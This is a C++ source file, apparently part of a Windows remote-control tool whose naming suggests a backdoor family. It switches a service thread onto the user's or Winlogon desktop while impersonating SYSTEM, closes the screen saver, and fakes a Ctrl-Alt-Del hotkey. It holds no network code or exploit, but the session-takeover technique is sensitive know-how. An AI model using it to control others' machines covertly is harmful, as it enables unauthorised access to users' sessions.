
#include "..\zxsCommon\debugoutput.h"
#include "..\zxsCommon\zxsWinAPI.h"
#include "switchdesktop.h"
#include "RunAs.h"


#include <WtsApi32.h>
#include <Userenv.h>

#pragma comment(lib, "WtsApi32.lib")
#pragma comment(lib, "Userenv.lib")

// globle api
pWTSGetActiveConsoleSessionId WTSGetActiveConsoleSessionId;
pWTSQueryUserToken _WTSQueryUserToken;

// Routine used to close the screen saver, if it's active...

BOOL CALLBACK
KillScreenSaverFunc(HWND hwnd, LPARAM lParam)
{
	char buffer[256];

	// - ONLY try to close Screen-saver windows!!!
	if ((GetClassName(hwnd, buffer, 256) != 0) &&
		(strcmp(buffer, "WindowsScreenSaverClass") == 0))
		PostMessage(hwnd, WM_CLOSE, 0, 0);
	return TRUE;
}

void
KillScreenSaver()
{
	OSVERSIONINFO osversioninfo;
	osversioninfo.dwOSVersionInfoSize = sizeof(osversioninfo);

	// Get the current OS version
	if (!ZXSAPI::GetVersionEx(&osversioninfo))
		return;

	//vnclog.Print(LL_INTINFO, VNCLOG("KillScreenSaver...\n"));

	// How to kill the screen saver depends on the OS
	switch (osversioninfo.dwPlatformId)
	{
	case VER_PLATFORM_WIN32_WINDOWS:
		{
			// Windows 95

			// Fidn the ScreenSaverClass window
			HWND hsswnd = FindWindow ("WindowsScreenSaverClass", NULL);
			if (hsswnd != NULL)
				PostMessage(hsswnd, WM_CLOSE, 0, 0); 
			break;
		} 
	case VER_PLATFORM_WIN32_NT:
		{
			// Windows NT

			// Find the screensaver desktop
			HDESK hDesk = OpenDesktop(
				"Screen-saver",
				0,
				FALSE,
				DESKTOP_READOBJECTS | DESKTOP_WRITEOBJECTS
				);
			if (hDesk != NULL)
			{
				//vnclog.Print(LL_INTINFO, VNCLOG("Killing ScreenSaver\n"));

				// Close all windows on the screen saver desktop
				EnumDesktopWindows(hDesk, (WNDENUMPROC) &KillScreenSaverFunc, 0);
				CloseDesktop(hDesk);
				// Pause long enough for the screen-saver to close
				//Sleep(2000);
				// Reset the screen saver so it can run again
				SystemParametersInfo(SPI_SETSCREENSAVEACTIVE, TRUE, 0, SPIF_SENDWININICHANGE); 
			}
			break;
		}
	}
}



BOOL
SelectHDESK(HDESK new_desktop)
{
	// Are we running on NT?
	//...
	HDESK old_desktop = GetThreadDesktop(GetCurrentThreadId());

	DWORD dummy;
	char new_name[256];

	if (!GetUserObjectInformation(new_desktop, UOI_NAME, &new_name, 256, &dummy)) {
		return FALSE;
	}

	// Switch the desktop
	if(!SetThreadDesktop(new_desktop)) {
		return FALSE;
	}

	// Switched successfully - destroy the old desktop
	CloseDesktop(old_desktop);

	return TRUE;


}

// - SelectDesktop(char *)
// Switches the current thread into a different desktop, by name
// Calling with a valid desktop name will place the thread in that desktop.
// Calling with a NULL name will place the thread in the current input desktop.

BOOL
_SelectDesktop(char *name)
{

	HDESK desktop;

		if (name != NULL)
		{
			// Attempt to open the named desktop
			desktop = OpenDesktop(name, 0, FALSE,
				DESKTOP_CREATEMENU | DESKTOP_CREATEWINDOW |
				DESKTOP_ENUMERATE | DESKTOP_HOOKCONTROL |
				DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS |
				DESKTOP_SWITCHDESKTOP | GENERIC_WRITE);
		}
		else
		{
			// No, so open the input desktop
			desktop = OpenInputDesktop(0, FALSE,
				DESKTOP_CREATEMENU | DESKTOP_CREATEWINDOW |
				DESKTOP_ENUMERATE | DESKTOP_HOOKCONTROL |
				DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS |
				DESKTOP_SWITCHDESKTOP | GENERIC_WRITE);
		}

		// Did we succeed?
		if (desktop == NULL) {
			goto error;
		}

		// Switch to the new desktop
		if (!SelectHDESK(desktop)) {
			// Failed to enter the new desktop, so free it!
			CloseDesktop(desktop);
			goto error;
		}

		// We successfully switched desktops!
		return TRUE;


error:
	return FALSE;
}

BOOL
SelectDesktop(char *name)
{
	BOOL ret;
	
	_CImpersonateSystem g_cis;//Impersonate SYSTEM

	ret = _SelectDesktop(name);
	
	return ret;
}

// NT only function to establish whether we're on the current input desktop

BOOL
_InputDesktopSelected()
{

		// Get the input and thread desktops
		HDESK threaddesktop = GetThreadDesktop(GetCurrentThreadId());
		HDESK inputdesktop = OpenInputDesktop(0, FALSE,
				DESKTOP_CREATEMENU | DESKTOP_CREATEWINDOW |
				DESKTOP_ENUMERATE | DESKTOP_HOOKCONTROL |
				DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS |
				DESKTOP_SWITCHDESKTOP | GENERIC_WRITE);

		// Get the desktop names:
		// *** I think this is horribly inefficient but I'm not sure.
		if (inputdesktop == NULL)
		{
			__printf("1. inputdesktop == NULL\r\n");

			ChangeServiceDesktop(NULL);

			inputdesktop = OpenInputDesktop(0, FALSE,
					DESKTOP_CREATEMENU | DESKTOP_CREATEWINDOW |
					DESKTOP_ENUMERATE | DESKTOP_HOOKCONTROL |
					DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS |
					DESKTOP_SWITCHDESKTOP | GENERIC_WRITE);

			if (inputdesktop == NULL)
			{
				__printf("2. inputdesktop == NULL\r\n");
				return FALSE;
			}
		}

		DWORD dummy;
		char threadname[256];
		char inputname[256];

		if (!GetUserObjectInformation(threaddesktop, UOI_NAME, &threadname, 256, &dummy)) {
			__printf("threaddesktop !\r\n");
			CloseDesktop(inputdesktop);
			return FALSE;
		}
		if (!GetUserObjectInformation(inputdesktop, UOI_NAME, &inputname, 256, &dummy)) {
			__printf("inputdesktop !\r\n");
			CloseDesktop(inputdesktop);
			return FALSE;
		}

		//__printf("threaddesktop: %s\r\n", threadname);
		//__printf("inputdesktop: %s\r\n", inputname);

		CloseDesktop(inputdesktop);
			

		if (strcmp(threadname, inputname) != 0)
			return FALSE;

	return TRUE;
}

BOOL
InputDesktopSelected()
{
	BOOL ret;

	_CImpersonateSystem g_cis;//Impersonate SYSTEM

	//CSelectDesktop::SelectSession(-1);

	ret = _InputDesktopSelected();

	RevertToSelf(); 

	return ret;
}

BOOL ChangeServiceDesktop(char *deskname)   
{
	//�����������Ĺ���վ������,ʹ�ÿ�����ʾ����,������MSDN����
	//For a noninteractive service application to interact with the user, 
	//it must open the user's window station ("WinSta0") and desktop ("Default"). 
	//By default, only the logged-on user and service applications running in the 
	//LocalSystem account are granted access to the user's window station and desktop.

	BOOL ret;
	HDESK   hdeskCurrent;
	HDESK   hdesk;
	HWINSTA hwinstaCurrent;
	HWINSTA hwinsta;

	//��ȡ��ǰ�����Ĺ���վ
	hwinstaCurrent = GetProcessWindowStation();
	if( hwinstaCurrent == NULL )
	{
		return 0;
	}

	//��ȡ��ǰ����������
	hdeskCurrent = GetThreadDesktop( GetCurrentThreadId() );
	if( hdeskCurrent == NULL )
	{
		return 0;
	}
	

	//��winsta0
	hwinsta = OpenWindowStation( "WinSta0", FALSE, GENERIC_ALL );
	if( hwinsta == NULL )
	{
		return 0;
	}

	SetProcessWindowStation( hwinsta );

	//��desktop
	hdesk = OpenDesktop( deskname ? deskname : "Default", 0, FALSE, GENERIC_ALL );
	if( hdesk == NULL )
	{
		SetProcessWindowStation(hwinstaCurrent);
		CloseWindowStation(hwinsta);
		return 0;
	}

	if(SetThreadDesktop( hdesk ))
	{
		CloseWindowStation(hwinstaCurrent);
		CloseDesktop(hdeskCurrent);
		return 1;
	}
	else
	{
		SetProcessWindowStation(hwinstaCurrent);
		CloseWindowStation(hwinsta);
		CloseDesktop(hdesk);
	}

	return 0;
}   

void *
SimulateCtrlAltDelThreadFn(void *context)
{
	HDESK old_desktop = GetThreadDesktop(GetCurrentThreadId());

	// Switch into the Winlogon desktop
	if (!SelectDesktop("Winlogon"))
	{
		return FALSE;
	}

	// Fake a hotkey event to any windows we find there.... :(
	// Winlogon uses hotkeys to trap Ctrl-Alt-Del...
	PostMessage(HWND_BROADCAST, WM_HOTKEY, 0, MAKELONG(MOD_ALT | MOD_CONTROL, VK_DELETE));

	// Switch back to our original desktop
	if (old_desktop != NULL)
		SelectHDESK(old_desktop);

	return NULL;
}
//////////////////////////////

CSelectSession::CSelectSession()
{
	WTSGetActiveConsoleSessionId = (pWTSGetActiveConsoleSessionId)
		ZXSAPI::GetProcAddress(ZXSAPI::GetModuleHandle("Kernel32"), "WTSGetActiveConsoleSessionId");

	_WTSQueryUserToken = (pWTSQueryUserToken)ZXSAPI::GetProcAddress(ZXSAPI::LoadLibrary("Wtsapi32.dll"), "WTSQueryUserToken");

}

DWORD CSelectSession::GetMySessionId()
{
	HANDLE myToken = NULL;
	DWORD TI, myTI = 0;
	DWORD RetLen;
	BOOL bResult = FALSE;

	if(_WTSQueryUserToken == NULL || WTSGetActiveConsoleSessionId == NULL)
		return 0;
/*
	bResult = ZXSAPI::OpenProcessToken(ZXSAPI::GetCurrentProcess(), TOKEN_ALL_ACCESS, &myToken);

	if(!bResult)
		return 0;

	bResult = GetTokenInformation(myToken, 
		TokenSessionId, 
		&myTI, 
		sizeof(DWORD), 
		&RetLen);

	CloseHandle(myToken);
*/

	bResult = ProcessIdToSessionId(GetCurrentProcessId(), &myTI);

	if(!bResult)
		return 0;

	return myTI;
}

DWORD CSelectSession::GetActiveSessionId()
{
	if(_WTSQueryUserToken == NULL || WTSGetActiveConsoleSessionId == NULL)
		return 0;
	
	return WTSGetActiveConsoleSessionId();

}

//////////////////////////////

CSelectDesktop::CSelectDesktop()
{
	WTSGetActiveConsoleSessionId = (pWTSGetActiveConsoleSessionId)
		ZXSAPI::GetProcAddress(ZXSAPI::GetModuleHandle("Kernel32"), "WTSGetActiveConsoleSessionId");

	ChangeServiceDesktop(NULL);
	//sysPID = GetProcessId("LSASS.EXE");
	prevTime = currTime = 0;
}

int CSelectDesktop::select(DWORD interval)
{

	if(interval)
	{
		currTime = GetTickCount();
		if(currTime - prevTime < interval)
			return 1;

		prevTime = currTime;
	}

	if (!InputDesktopSelected())
	{
		if (!SelectDesktop(NULL))
			return FALSE;
	}

	return TRUE;
}